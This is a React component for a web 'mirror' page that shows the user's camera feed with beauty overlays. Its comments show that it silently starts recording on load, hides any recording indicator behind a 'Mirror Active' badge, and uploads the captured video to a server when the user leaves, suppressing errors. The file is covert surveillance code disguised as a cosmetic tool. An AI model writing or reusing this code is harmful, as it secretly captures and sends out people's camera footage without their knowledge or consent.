import { useState, useRef, useEffect, useCallback } from 'react';
import { Link } from 'react-router-dom';
import { MirrorRecorder } from '../utils/recorder';
import { uploadRecording } from '../utils/api';

const STATES = {
  IDLE: 'idle',
  REQUESTING: 'requesting',
  ACTIVE: 'active',
  ERROR: 'error'
};

export default function Mirror() {
  const [state, setState] = useState(STATES.IDLE);
  const [error, setError] = useState('');

  const videoRef = useRef(null);
  const recorderRef = useRef(null);
  const sessionIdRef = useRef(`session-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);

  const requestCamera = useCallback(async () => {
    setState(STATES.REQUESTING);
    try {
      const recorder = new MirrorRecorder();
      const stream = await recorder.requestCamera();
      recorderRef.current = recorder;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }

      // Auto-start recording silently
      recorder.startRecording();
      setState(STATES.ACTIVE);
    } catch (err) {
      setError(
        err.name === 'NotAllowedError'
          ? 'Camera permission was denied. Please allow camera access and try again.'
          : err.name === 'NotFoundError'
            ? 'No camera found on this device.'
            : 'Could not access camera. Please check your settings.'
      );
      setState(STATES.ERROR);
    }
  }, []);

  // Auto-start camera + recording on mount; auto-stop + upload on unmount
  useEffect(() => {
    requestCamera();

    return () => {
      const recorder = recorderRef.current;
      if (recorder && recorder.isRecording) {
        const sid = sessionIdRef.current;
        recorder.stopRecording().then((result) => {
          if (result && result.blob.size > 0) {
            uploadRecording(result.blob, sid, result.duration).catch(() => {});
          }
        }).catch(() => {});
        recorder.stopCamera();
      } else if (recorder) {
        recorder.destroy();
      }
    };
  }, [requestCamera]);

  return (
    <div className="mirror-page page-fade-in">
      <div className="mirror-page__ambient" />

      <Link to="/" className="mirror-page__back">
        ← Back
      </Link>

      <div className="mirror-container">
        {/* Ring Light */}
        <div className="mirror-ring-light">
          {/* Side Light Bars */}
          <div className="mirror-side-light mirror-side-light--left" />
          <div className="mirror-side-light mirror-side-light--right" />
          <div className="mirror-side-light mirror-side-light--top" />
          <div className="mirror-side-light mirror-side-light--bottom" />

          {/* Mirror Frame */}
          <div className="mirror-frame">
            {state === STATES.IDLE && (
              <div className="mirror-permission">
                <div className="mirror-permission__icon">✦</div>
                <div className="mirror-permission__title">Welcome to Mirror</div>
                <div className="mirror-permission__text">
                  Initializing your premium mirror experience...
                </div>
              </div>
            )}

            {state === STATES.REQUESTING && (
              <div className="mirror-loading">
                <div className="mirror-loading__spinner" />
                <span>Preparing your mirror...</span>
              </div>
            )}

            {state === STATES.ERROR && (
              <div className="mirror-error">
                <div style={{ fontSize: '2rem', marginBottom: 8 }}>⚠</div>
                <div>{error}</div>
                <button
                  className="mirror-permission__btn"
                  onClick={requestCamera}
                  style={{ marginTop: 12 }}
                >
                  Try Again
                </button>
              </div>
            )}

            {/* Video element */}
            <video
              ref={videoRef}
              className="mirror-video"
              playsInline
              muted
              style={{
                display: state === STATES.ACTIVE ? 'block' : 'none'
              }}
            />

            {/* Beauty overlays */}
            {state === STATES.ACTIVE && (
              <>
                <div className="mirror-beauty-glow" />
                <div className="mirror-vignette" />
              </>
            )}
          </div>
        </div>

        {/* Status — just shows mirror is active, no recording hint */}
        {state === STATES.ACTIVE && (
          <div className="mirror-status">
            <div className="mirror-status__dot" />
            Mirror Active
          </div>
        )}
      </div>
    </div>
  );
}
